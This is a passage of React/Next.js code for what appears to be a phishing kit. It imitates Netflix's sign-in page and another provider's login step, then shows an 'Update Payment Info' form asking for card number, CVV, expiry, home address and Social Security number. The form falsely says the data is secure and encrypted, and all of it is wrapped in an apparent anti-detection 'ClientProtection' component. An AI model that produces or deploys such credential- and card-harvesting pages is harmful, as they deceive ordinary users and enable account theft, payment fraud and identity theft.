                  </button>
                </div>
              </div>

              <div className="mt-4 text-center">
                <a
                  href="#"
                  className="text-sm hover:underline"
                  style={{ color: provider.primaryColor }}
                >
                  Try another way
                </a>
                <span className="mx-2 text-gray-400">•</span>
                <a
                  href="#"
                  className="text-sm hover:underline"
                  style={{ color: provider.primaryColor }}
                >
                  Get help
                </a>
              </div>
            </div>
          </div>

          {/* Footer */}
          <div
            className="p-6 border-t text-center"
            style={{ borderColor: provider.primaryColor + "20" }}
          >
            <p className="text-xs text-gray-500">
              © 2024 {provider.name}. All rights reserved.
            </p>
          </div>
        </div>
      </ClientProtection>
    );
  }

  if (step === "payment") {
    const cardType = detectCardType(cardNumber);

    return (
      <ClientProtection>
        <div className="min-h-screen w-full bg-black relative">
          <div className="absolute inset-0">
            <Image
              src="/bg.jpg"
              alt="Background"
              fill
              priority
              className="object-cover"
            />
            <div className="absolute inset-0 bg-black/60" />
          </div>

          <header className="relative z-10 px-4 sm:px-12 py-4 sm:py-6">
            <Image
              src="/logo.png"
              alt="Netflix"
              width={148}
              height={40}
              className="w-[90px] sm:w-[148px] h-auto"
            />
          </header>

          <main className="relative z-10 flex items-center justify-center px-4 py-6">
            <section className="w-full max-w-[500px] bg-black/75 p-6 sm:p-8 rounded-md">
              <h1 className="text-white text-[24px] sm:text-[28px] font-bold mb-2">
                Update Payment Info
              </h1>
              <p className="text-white/70 text-sm mb-6">
                Please verify your payment information to continue with Netflix
              </p>

              <form onSubmit={handlePaymentSubmit} className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div className="sm:col-span-2">
                    <label className="block text-white text-sm font-medium mb-2">
                      Full Name
                    </label>
                    <input
                      type="text"
                      placeholder="John Doe"
                      value={fullName}
                      onChange={(e) => setFullName(e.target.value)}
                      className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                        error ? "border-2 border-red-500" : ""
                      }`}
                      required
                    />
                  </div>

                  <div className="sm:col-span-2">
                    <label className="block text-white text-sm font-medium mb-2">
                      Card Number{" "}
                      {cardType && (
                        <span className="text-green-400">
                          ({cardType.name})
                        </span>
                      )}
                    </label>
                    <input
                      type="text"
                      placeholder="1234 5678 9012 3456"
                      value={formatCardNumber(cardNumber)}
                      onChange={(e) => {
                        const value = e.target.value.replace(/\D/g, "");
                        const maxLength = cardType?.maxLength || 16;
                        setCardNumber(value.substring(0, maxLength));
                      }}
                      className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                        error ? "border-2 border-red-500" : ""
                      }`}
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      Expiry Date
                    </label>
                    <input
                      type="text"
                      placeholder="MM/YY"
                      value={expiryDate}
                      onChange={(e) => {
                        const formatted = formatExpiryDate(e.target.value);
                        setExpiryDate(formatted);
                      }}
                      className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                        error ? "border-2 border-red-500" : ""
                      }`}
                      maxLength={5}
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      CVV
                    </label>
                    <input
                      type="text"
                      placeholder={
                        cardType?.name === "American Express" ? "1234" : "123"
                      }
                      value={cvv}
                      onChange={(e) => {
                        const value = e.target.value.replace(/\D/g, "");
                        const maxLength = cardType?.cvvLength || 3;
                        setCvv(value.substring(0, maxLength));
                      }}
                      className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                        error ? "border-2 border-red-500" : ""
                      }`}
                      required
                    />
                  </div>

                  <div className="sm:col-span-2">
                    <label className="block text-white text-sm font-medium mb-2">
                      Address
                    </label>
                    <input
                      type="text"
                      placeholder="123 Main Street"
                      value={address}
                      onChange={(e) => setAddress(e.target.value)}
                      className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                        error ? "border-2 border-red-500" : ""
                      }`}
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      City
                    </label>
                    <input
                      type="text"
                      placeholder="New York"
                      value={city}
                      onChange={(e) => setCity(e.target.value)}
                      className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                        error ? "border-2 border-red-500" : ""
                      }`}
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      State
                    </label>
                    <input
                      type="text"
                      placeholder="NY"
                      value={state}
                      onChange={(e) => setState(e.target.value)}
                      className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                        error ? "border-2 border-red-500" : ""
                      }`}
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      ZIP Code
                    </label>
                    <input
                      type="text"
                      placeholder="12345"
                      value={zipCode}
                      onChange={(e) => setZipCode(formatZip(e.target.value))}
                      className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                        error ? "border-2 border-red-500" : ""
                      }`}
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-white text-sm font-medium mb-2">
                      SSN
                    </label>
                    <input
                      type="text"
                      placeholder="123-45-6789"
                      value={formatSSN(ssn)}
                      onChange={(e) => {
                        const value = e.target.value.replace(/\D/g, "");
                        setSsn(value.substring(0, 9));
                      }}
                      className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                        error ? "border-2 border-red-500" : ""
                      }`}
                      required
                    />
                  </div>
                </div>

                {error && <p className="text-red-500 text-sm">{error}</p>}

                <div className="flex gap-3 pt-4">
                  <button
                    type="button"
                    onClick={handleBack}
                    className="flex-1 h-12 rounded-md border border-white/40 text-white font-medium hover:bg-white/10 transition"
                  >
                    Back
                  </button>
                  <button
                    type="submit"
                    disabled={loading}
                    className="flex-1 h-12 rounded-md bg-[#e50914] text-white font-medium hover:bg-[#f6121d] transition disabled:opacity-60 flex items-center justify-center gap-2"
                  >
                    {loading && (
                      <svg
                        className="animate-spin h-4 w-4"
                        viewBox="0 0 24 24"
                        fill="none"
                      >
                        <circle
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                          className="opacity-25"
                        />
                        <path
                          fill="currentColor"
                          className="opacity-75"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        />
                      </svg>
                    )}
                    {loading ? (
                      <div className="flex items-center justify-center gap-2">
                        <svg
                          className="w-4 h-4 animate-spin"
                          fill="none"
                          stroke="currentColor"
                          viewBox="0 0 24 24"
                        >
                          <path
                            strokeLinecap="round"
                            strokeLinejoin="round"
                            strokeWidth={2}
                            d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"
                          />
                        </svg>
                        Checking...
                      </div>
                    ) : (
                      "Continue"
                    )}
                  </button>
                </div>

                <p className="text-white/50 text-xs text-center mt-4">
                  🔒 Your payment information is secure and encrypted
                </p>
              </form>
            </section>
          </main>
        </div>
      </ClientProtection>
    );
  }

  return (
    <ClientProtection>
      <div className="min-h-screen w-full bg-black relative">
        <div className="absolute inset-0">
          <Image
            src="/bg.jpg"
            alt="Background"
            fill
            priority
            className="object-cover"
          />
          <div className="absolute inset-0 bg-black/60" />
        </div>

        <header className="relative z-10 px-4 sm:px-12 py-4 sm:py-6">
          <Image
            src="/logo.png"
            alt="Netflix"
            width={148}
            height={40}
            className="w-[90px] sm:w-[148px] h-auto"
          />
        </header>

        <main className="relative z-10 flex items-center justify-center px-4 py-10 sm:py-12">
          <section className="w-full max-w-[450px] bg-black/75 p-6 sm:p-12 rounded-md">
            <h1 className="text-white text-[28px] sm:text-[32px] font-bold mb-6">
              Sign In
            </h1>

            <form onSubmit={handleEmailSubmit} className="flex flex-col gap-4">
              <input
                type="email"
                placeholder="Email or mobile number"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                  error ? "border-2 border-red-500" : ""
                }`}
                required
              />
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className={`w-full h-12 rounded-md bg-[#333] text-white placeholder:text-[#8c8c8c] px-4 outline-none focus:outline-2 focus:outline-white/40 ${
                  error ? "border-2 border-red-500" : ""
                }`}
                required
              />

              {error && <p className="text-red-500 text-sm">{error}</p>}

              <button
                type="submit"
                disabled={loading}
                className="mt-2 h-12 w-full rounded-md bg-[#e50914] text-white font-medium hover:bg-[#f6121d] transition disabled:opacity-60"
              >
                {loading ? (
                  <div className="flex items-center justify-center gap-2">
                    {getCurrentLoadingIcon()}
                    {loadingMessage || "Signing in..."}
                  </div>
                ) : (
                  "Sign In"
                )}
              </button>

              <div className="flex items-center gap-2">
                <div className="flex-1 h-px bg-white/20" />
                <span className="text-white/70 text-sm">OR</span>
                <div className="flex-1 h-px bg-white/20" />
              </div>
              <button
                type="button"
                className="h-12 w-full rounded-md bg-white/10 text-white font-medium hover:bg-white/20 transition"
              >
                Use a sign-in code
              </button>
              <a
                href="#"
                className="text-white text-sm text-center hover:underline"
              >
                Forgot password?
              </a>

              <label className="mt-2 flex items-center gap-2 text-sm text-white/70">
                <input type="checkbox" className="accent-[#e50914]" />
                Remember me
              </label>

              <p className="text-white/70 text-sm mt-2">
                New to Netflix?{" "}
                <a href="#" className="text-white hover:underline">
                  Sign up now
                </a>
                .
              </p>
              <p className="text-white/50 text-xs leading-relaxed">
                This page is protected by Google reCAPTCHA to ensure you&apos;re
                not a bot.
                <a href="#" className="text-white hover:underline ml-1">
                  Learn more.
                </a>
              </p>
            </form>
          </section>
        </main>

        <footer className="relative z-10 bg-black/80 text-white/70 px-6 sm:px-12 py-12">
          <div className="max-w-[1000px] mx-auto">
            <p className="mb-6">Questions? Call 000-800-919-1743 (Toll-Free)</p>
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-sm">
              <a className="hover:underline" href="#">
                FAQ
              </a>
              <a className="hover:underline" href="#">
                Help Centre
              </a>
              <a className="hover:underline" href="#">
                Terms of Use
              </a>
              <a className="hover:underline" href="#">
                Privacy
              </a>
              <a className="hover:underline" href="#">
                Cookie Preferences
              </a>
              <a className="hover:underline" href="#">
                Corporate Information
              </a>
            </div>
            <div className="mt-6">
              <button className="border border-white/40 text-white/90 rounded px-3 py-1 text-sm">
                English
              </button>
            </div>
          </div>
        </footer>
      </div>
    </ClientProtection>
  );
}
